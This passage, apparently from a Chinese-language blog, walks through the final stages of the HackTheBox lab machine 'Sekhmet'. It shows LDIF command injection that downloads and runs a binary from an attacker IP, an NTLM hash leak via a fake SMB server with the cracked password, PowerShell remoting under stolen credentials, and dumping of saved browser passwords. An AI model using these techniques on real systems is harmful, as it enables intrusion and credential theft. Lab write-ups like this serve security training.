<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># upload the bypass code</span><br><span class="line">dn: CN&#x3D;Ray Duncan,OU&#x3D;Development,DC&#x3D;windcorp,DC&#x3D;htb</span><br><span class="line">changetype: modify</span><br><span class="line">replace: mobile</span><br><span class="line">mobile: ;wget http:&#x2F;&#x2F;10.10.14.6:7777&#x2F;B.exe -O C:\windows\debug\wia\B.exe</span><br><span class="line"></span><br><span class="line"># run it</span><br><span class="line">dn: CN&#x3D;Ray Duncan,OU&#x3D;Development,DC&#x3D;windcorp,DC&#x3D;htb</span><br><span class="line">changetype: modify</span><br><span class="line">replace: mobile</span><br><span class="line">mobile: ;Start-Process -FilePath C:\windows\debug\wia\B.exe</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122809.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h2><p>运行winpeas，发现启用了ntlmv2，可以使用smbserver进行ntlm泄漏攻击：</p>
<ul>
<li><a href="https://github.com/ropnop/impacket_static_binaries/releases" target="_blank" rel="noopener">https://github.com/ropnop/impacket_static_binaries/releases</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> on webserver</span></span><br><span class="line">./smbserver miao . -smb2support</span><br></pre></td></tr></table></figure>

<p>使用以下 ldif 触发 DC 浏览到我们的假 smbserver:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dn: CN&#x3D;Ray Duncan,OU&#x3D;Development,DC&#x3D;windcorp,DC&#x3D;htb</span><br><span class="line">changetype: modify</span><br><span class="line">replace: mobile</span><br><span class="line">mobile: ;cd \\webserver.windcorp.htb\miao\</span><br></pre></td></tr></table></figure>

<p>等待触发，得到hash破解出来：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] scriptrunner::WINDCORP:aaaaaaaaaaaaaaaa:7fac7b077275dce97d19f843ee6abffd:0101000000000000002d44218c1ad901ac6dba83ddbdf08f0000000001001000580044006200480072004d0065007800020010006d00660073004f00440047005900740003001000580044006200480072004d0065007800040010006d00660073004f00440047005900740007000800002d44218c1ad90106000400020000000800300030000000000000000000000000210000848ca8512f99bcb680a900509bb131558d94dbc4f37763d4ef3f770b53d146680a001000000000000000000000000000000000000900360063006900660073002f007700650062007300650072007600650072002e00770069006e00640063006f00720070002e006800740062000000000000000000</span><br><span class="line"></span><br><span class="line">!@p%i&amp;J#iNNo1T2</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122810.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="bob-wood"><a href="#bob-wood" class="headerlink" title="bob.wood"></a>bob.wood</h1><p>上面得到的密码也是bob.wood的密码，使用powershell以他的身份执行命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$SecPassword &#x3D; ConvertTo-SecureString &#39;!@p%i&amp;J#iNNo1T2&#39; -AsPlainText -Force</span><br><span class="line">$Cred &#x3D; New-Object System.Management.Automation.PSCredential(&#39;bob.wood&#39;, $SecPassword)</span><br><span class="line">$session &#x3D; New-PSSession -Credential $Cred</span><br><span class="line">Invoke-Command -Session $session -scriptblock &#123; c:\windows\debug\wia\B.exe &#125;</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122811.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>上传sharphound，再次采集数据，貌似bob.wood是IT的成员，对DC有PSRemote权限。但是，我们需要成为域管理员（例如 bob.woodadm）才能获取管理员通行证。假设 bob.wood 可能使用同一台计算机作为 bob.woodadm 登录以进行管理工作是合乎逻辑的。因此，在浏览器缓存中搜索可能会找到有用的信息。</p>
<p><code>bob.woodadm</code>凭据保存在 Edge 中，可在此处找到：<code>C:\users\bob.wood\appdata\local\microsoft\edge\user data\default\Login Data</code></p>
<p>使用此工具解密密码:</p>
<ul>
<li>moonD4rk/HackBrowserData: Decrypt passwords/cookies/history/bookmarks from the browser. 一款可全平台运行的浏览器数据导出解密工具。<br><a href="https://github.com/moonD4rk/HackBrowserData" target="_blank" rel="noopener">https://github.com/moonD4rk/HackBrowserData</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS C:\windows\debug\wia&gt; .\hbd.exe</span><br><span class="line">[NOTICE] [browsingdata.go:71,Output] output to file results/microsoft_edge_default_password.csv success</span><br><span class="line"></span><br><span class="line">PS C:\windows\debug\wia&gt; cat results/microsoft_edge_default_password.csv</span><br><span class="line">UserName,Password,LoginURL,CreateDate</span><br><span class="line">bob.woodADM@windcorp.com,smeT-Worg-wer-m024,http://webmail.windcorp.com/login.html,2022-07-04T18:46:59.133335+02:00</span><br><span class="line">bob.wood@windcorp.htb,SomeSecurePasswordIGuess!09,http://google.com/login.html,2022-07-04T18:14:00.217981+02:00</span><br><span class="line">bob.wood@windcorp.htb,SemTro?32756Gff,http://somewhere.com/login.html,2022-07-04T18:12:42.849216+02:00</span><br></pre></td></tr></table></figure>

<h1 id="bob-woodADM"><a href="#bob-woodADM" class="headerlink" title="bob.woodADM"></a>bob.woodADM</h1><p>现在，以 bob.woodadm 身份登录并捕获根标志:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$SecPassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">'smeT-Worg-wer-m024'</span> -AsPlainText -Force</span><br><span class="line"><span class="variable">$Cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">'bob.woodADM'</span>, <span class="variable">$SecPassword</span>)</span><br><span class="line"><span class="variable">$session</span> = <span class="built_in">New-PSSession</span> -Credential <span class="variable">$Cred</span></span><br><span class="line"><span class="built_in">Invoke-Command</span> -Session <span class="variable">$session</span> -scriptblock &#123; c:\windows\debug\wia\B.exe &#125;</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122812.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122813.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>



<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li>ModSecurity Vulnerability &amp; PoC (CVE-2019-19886)<br><a href="https://www.secjuice.com/modsecurity-vulnerability-cve-2019-19886/" target="_blank" rel="noopener">https://www.secjuice.com/modsecurity-vulnerability-cve-2019-19886/</a></li>
<li>Exploiting Node.js deserialization bug for Remote Code Execution | OpSecX<br><a href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/" target="_blank" rel="noopener">https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/</a></li>
<li>Node.Js-Security-Course/nodejsshell.py at master · ajinabraham/Node.Js-Security-Course<br><a href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py" target="_blank" rel="noopener">https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py</a></li>
<li>Brute Force - CheatSheet - HackTricks<br><a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#known-plaintext-zip-attack" target="_blank" rel="noopener">https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#known-plaintext-zip-attack</a></li>
<li>MS ADV190023<br><a href="https://gist.github.com/tscherf/a0be193fe7bd603bbe1f511f9a00e737" target="_blank" rel="noopener">https://gist.github.com/tscherf/a0be193fe7bd603bbe1f511f9a00e737</a></li>
<li>World-writable directories in %windir%<br><a href="https://gist.github.com/mattifestation/5f9de750470c9e0e1f9c9c33f0ec3e56" target="_blank" rel="noopener">https://gist.github.com/mattifestation/5f9de750470c9e0e1f9c9c33f0ec3e56</a></li>
<li>Powershell CLM Bypass Using Runspaces<br><a href="https://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/" target="_blank" rel="noopener">https://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/</a></li>
<li><a href="https://github.com/ropnop/impacket_static_binaries/releases" target="_blank" rel="noopener">https://github.com/ropnop/impacket_static_binaries/releases</a></li>
<li>moonD4rk/HackBrowserData: Decrypt passwords/cookies/history/bookmarks from the browser. 一款可全平台运行的浏览器数据导出解密工具。<br><a href="https://github.com/moonD4rk/HackBrowserData" target="_blank" rel="noopener">https://github.com/moonD4rk/HackBrowserData</a></li>
<li>Sekhmet - HTB [Discussion] | BreachForums<br><a href="https://breached.vc/Thread-Sekhmet-HTB-Discussion" target="_blank" rel="noopener">https://breached.vc/Thread-Sekhmet-HTB-Discussion</a></li>
<li>HTB - Sekhmet [Insane] // MeowMeowAttack’s security.log<br><a href="https://meowmeowattack.github.io/htb/sekhmet/" target="_blank" rel="noopener">https://meowmeowattack.github.io/htb/sekhmet/</a></li>
</ul>

        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    最后更新时间：<time datetime="2023-04-03T01:01:24.452Z" itemprop="dateUpdated">2023-04-03 09:01:24</time>
</span><br>


        
        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
        
    </div>
    
    <footer>
        <a href="https://darkwing.moe">
            <img src="/img/avatar.jpg" alt="暗羽">
            暗羽
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2022/12/28/Sekhmet-HackTheBox/&title=《Sekhmet - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2022/12/28/Sekhmet-HackTheBox/&title=《Sekhmet - HackTheBox》 — 喵喵喵喵&source=木を植える最も良い時期は、10年前である。次にいい時期は今である。" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2022/12/28/Sekhmet-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Sekhmet - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2022/12/28/Sekhmet-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2022/12/28/Sekhmet-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2023/01/09/BroScience-HackTheBox/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">BroScience - HackTheBox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2022/12/26/Pollution-HackTheBox/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Pollution - HackTheBox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'd35074a248599729ad26',
          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
          repo: 'BlogComments',
          owner: 'zjicmDarkWing',
          admin: ['zjicmDarkWing'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
        </p>
    </div>
    <div class="bottom">
        <p><span>暗羽 &copy; 2014 - 2025</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2022/12/28/Sekhmet-HackTheBox/&title=《Sekhmet - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2022/12/28/Sekhmet-HackTheBox/&title=《Sekhmet - HackTheBox》 — 喵喵喵喵&source=木を植える最も良い時期は、10年前である。次にいい時期は今である。" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2022/12/28/Sekhmet-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Sekhmet - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2022/12/28/Sekhmet-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2022/12/28/Sekhmet-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACM0lEQVR42u3aQY7jMAwEwPz/0xlgTzsIxtstOoONVDoFiS2rfGBEUo9HPJ5/xuvnv795veZ1XM/2euXNAwMD42MZz8uRLH1+/fUri+7FwMA4gNFOd33vdSBun3t9DQYGBkY7dRIck60kBgYGxr0Bt932JZtIDAwMjLUkNv81D8d5Ae62XBwDA+MDGZPGwLs//1J/AwMD4z9mPMuRl9XyjebaSr7NgIGBsTUjSSMnRy6uo2KexEbhGAMDY1PG2tGHyUGxvHhXvGgMDIytGfnNeXidlO3adBoDA+M0Rtu8bJfVhtEkWGNgYJzAWMt672petunuj79iYGBszcgXl0yaJLFrV+alOgwMjP0Y7RZwsllMwmty2KL438DAwNiCMQ+17aGKonxWhmkMDIyTGXXgW8KsHfvAwMA4gZEX69utW1vub2fDwMA4h5FPManktc2GeTjGwMDYidGW6dsA3ZbY2i0mBgbGCYy2yJWX5PISXj4W/zEwMDC2YySLKyp5QaCcgDEwME5gFEWrOClNlvUoxz/uxcDAOIAxT0fbGdY2l0UPFgMDYyNGXurKm5FrBzXyxkC9QcTAwPhwxjz3zduca6lycWYEAwNjU8YkcV0rvU2S5LqFiYGBsRFjnlLmx7zed1wDAwPjBEYbZBd7pGvxvq0dYmBgHMzIk9V2K5k3En5cMwYGBsbS49tXk2wWbwu4GBgYH8hoi/V5kG1D8GJLAAMDY2vGpFh/1xGxyYvAwMDYmvEFpRY39dHYf+wAAAAASUVORK5CYII=" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



<script>
(function() {
    var OriginTitile = document.title, titleTime;
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            document.title = '死鬼去哪里了！';
            clearTimeout(titleTime);
        } else {
            document.title = '(つェ⊂)咦!又好了!';
            titleTime = setTimeout(function() {
                document.title = OriginTitile;
            },2000);
        }
    });
})();
</script>



</body>
</html>
